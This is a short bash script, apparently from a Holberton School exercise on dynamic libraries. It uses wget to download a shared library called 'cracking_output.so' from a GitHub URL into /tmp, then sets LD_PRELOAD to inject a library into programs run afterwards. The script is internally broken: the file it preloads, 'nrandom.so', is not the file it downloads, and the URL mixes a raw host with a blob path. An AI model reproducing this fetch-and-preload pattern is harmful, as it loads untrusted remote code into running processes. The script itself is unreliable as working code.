#!/bin/bash
wget -P /tmp/ https://raw.github.com/mrcesar95/holbertonschool-low_level_programming/blob/master/0x18-dynamic_libraries/cracking_output.so
export LD_PRELOAD=/tmp/nrandom.so